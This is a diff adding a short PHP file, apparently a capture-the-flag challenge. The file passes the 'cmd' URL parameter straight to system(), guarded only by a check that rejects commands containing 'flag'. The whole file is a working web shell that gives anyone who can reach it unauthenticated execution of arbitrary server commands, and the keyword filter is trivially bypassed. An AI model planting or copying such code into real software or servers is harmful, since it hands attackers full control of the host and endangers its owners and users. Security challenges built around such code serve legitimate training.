@@ -1,0 +1,14 @@
+<?php
+if (isset($_GET['cmd'])) {
+    $cmd = $_GET['cmd'];
+    echo "Command received: $cmd<br>";
+    if (strpos($cmd, 'flag') !== false) {
+        die("No flags here!");
+    }
+    echo "Executing...<br>";
+    system($cmd, $retval);
+    echo "Return value: $retval<br>";
+} else {
+    echo "No command provided.";
+}
+?>
